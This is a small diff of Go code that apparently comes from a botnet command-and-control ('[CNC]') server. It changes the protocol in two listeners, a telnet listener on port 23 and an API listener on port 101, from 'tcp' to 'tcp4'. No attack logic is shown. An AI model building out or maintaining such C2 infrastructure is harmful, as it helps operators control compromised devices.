@@ -14,13 +14,13 @@ var clientList *ClientList = NewClientList()
 
 func main() {
 	fmt.Println("[CNC] Start")
-	tel, err := net.Listen("tcp", "0.0.0.0:23")
+	tel, err := net.Listen("tcp4", "0.0.0.0:23")
 	if err != nil {
 		fmt.Println(err)
 		return
 	}
 
-	api, err := net.Listen("tcp", "0.0.0.0:101")
+	api, err := net.Listen("tcp4", "0.0.0.0:101")
 	if err != nil {
 		fmt.Println(err)
 		return
